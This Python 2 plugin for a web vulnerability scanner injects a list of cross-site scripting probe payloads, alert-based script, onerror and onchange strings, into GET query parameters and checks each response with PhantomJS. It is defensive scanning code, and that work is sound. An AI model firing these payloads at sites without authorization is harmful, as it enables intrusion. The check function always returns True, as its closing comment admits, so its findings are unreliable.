#!/usr/bin/env python
# -*- coding: utf-8 -*-
import subprocess
import time
import urlparse
import urllib
import simplejson as json
import base64
from modules.scan import MePlugin


class MeScan(MePlugin):
    """
    类名不可修改，而且需要继承于plugin
    """

    def __init__(self):
        super(self.__class__, self).__init__()
        self.plugin_info = {
            "name": "xss检测插件",  # 插件的名称
            "product": "带有KV的Request",  # 该插件所针对的应用名称,严格按照文档上的进行填写
            "product_version": "*",  # 应用的版本号,严格按照文档上的进行填写
            "desc": """
            针对带有KV的所有Request请求
            """,  # 插件的描述
            "author": "wooyaa",  # 插件作者
            "ref": [
                {self.ref.url: "https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"},  # 引用的url
                {self.ref.src: "58SRC-201801117"},  # src上的案例
            ],
            "type": self.type.xss,  # 漏洞类型
            "severity": self.level.low,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "target": self.flow_data['url']
        }

    def match(self):
        """
        匹配是否调用此插件
        :return:
        """
        return True

    def check(self):
        """
        验证类型，尽量不触发waf规则
        :return:
        """
        #return False
        vulurllist = []

        req_data = self.flow_data
        url = req_data['url']
        method = req_data['method']
        cookie = req_data['cookie']
        post_data = req_data['post_data']

        try:
            arr = urlparse.urlparse(url)
            action = urlparse.urlunsplit((arr.scheme, arr.netloc, arr.path, '', ''))
            pairs = urlparse.parse_qsl(arr.query)
        except Exception, e:
            print "parse error url : " + url

        if method.upper() == 'GET':
            for k, v in pairs:
                qs = ""
                inj = "585858xss"
                for key, val in pairs:
                    val = val + inj if (key == k) else val
                    if qs != "":
                        qs = qs + "&" + urllib.quote(key) + "=" + urllib.quote(val)
                    else:
                        qs = urllib.quote(key) + "=" + urllib.quote(val)
                scanurl = action + "?" + qs
                vulurllist.append(scanurl)

        if not vulurllist:
            return None
        #else:
            #print "exist"
            #print vulurllist

        # payloads = ["\"><script>alert(585858)</script><\"","--></script><script>alert(585858)</script>","alert(585858)","<img src=1 onerror=alert(585858)>","#<58domxss>","#\'/><58domxss>","#\"><58domxss>","#\"/><58domxss>","#\'/></script><58domxss>","#\"/></script><58domxss>","%20onchange=alert(585858)","\' onchange=\'alert(585858)","\" onchange=\"alert(585858)","\'>\';</script>>\"><script>alert(585858)</script>\'",";alert(585858);//","\"><img src=1 onerror=alert(585858)>","\"\'><body id=ssltest title=alert(585858) onload=eval(ssltest.title)>",">\'>\"><script>alert(585858)</script>","\"></noscript><script>alert(585858)</script>","</textarea></title><script>alert(585858)</script>","<scrip<script>t>window.a==1?1:alert(585858)</scrip</script>t>","<script>confirm(585858)</script>","\");alert(585858);//","\";alert(585858);//","\'\";alert(585858);//","\';alert(585858);\'","</script><script>alert(585858);//","javascript:alert(585858)","javascript%26%2358%3Balert%28585858%29","\";alert(585858);\"","\';alert(585858);\'","%0Aalert(585858);","data:text/html,<script>alert(585858)</script>","\'>\"></title></textarea></script><img+src=a+onerror=alert(585858)>"]
        payloads = ["\"><script>alert(585858)</script><\"", "--></script><script>alert(585858)</script>",
                    "\' onchange=\'alert(585858)", ">\'>\"><script>alert(585858)</script>"]

        for scanurls in vulurllist:
            for payload in payloads:
                scanurl = scanurls.replace("585858xss", payload)
                # 需要将cookie传给js,通过base64编码字符串实现
                jsurl = base64.b64encode(scanurl)
                jsmethod = method
                jscookie = base64.b64encode(str(cookie))
                jsrequest_data = base64.b64encode(str(post_data))

                # "phantomjs modules/hello.js {url} {method} {cookie} {request_data}"
                cmd = "phantomjs /Users/ls/github/phantomjs/hello.js %s %s %s %s" % (
                    jsurl, jsmethod, jscookie, jsrequest_data)
                # print cmd
                stdout, stderr = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                                  stderr=subprocess.PIPE).communicate()
                # print stdout
                if 'Success' in stdout:
                    vul_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
                    vul_type = 'xss'
                    vul_level = '中危'
                    vul_url = scanurl
                    print ('Result:' + vul_time, vul_type, vul_level, vul_url, payload)
                    # 将扫描到的漏洞记入数据库
                    # result(vul_time, vul_type, vul_level, vul_url, payload)
                    break
        return True  #一看就是测试的，不管怎样都返回True，不联网也被检测出XSS


if __name__ == '__main__':
    from modules.main import main

    main(MeScan())
